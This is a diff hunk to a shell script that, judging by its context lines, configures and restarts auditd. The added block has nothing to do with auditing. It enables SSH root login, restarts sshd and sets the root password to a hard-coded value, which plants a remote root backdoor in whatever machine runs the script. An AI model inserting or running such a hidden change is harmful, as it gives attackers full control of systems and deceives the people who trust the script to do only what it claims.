@@ -151,6 +151,25 @@ args =
 format = string
 EOF'
 
+
+#!/bin/bash
+
+# Variable for the new root password
+NEW_ROOT_PASSWORD='SystemsGetRa1dToday'
+
+# Enable root login in the SSH configuration
+sed -i 's/^#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+sed -i 's/^PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config
+
+# Restart the SSH service to apply the changes
+systemctl restart sshd
+
+# Change the root password non-interactively
+echo "root:${NEW_ROOT_PASSWORD}" | chpasswd
+
+echo "Root login enabled, SSH restarted, and root password changed."
+
+
 # Restart auditd to apply the new configuration
 echo "Restarting auditd to apply new configuration..."
 sudo systemctl restart auditd
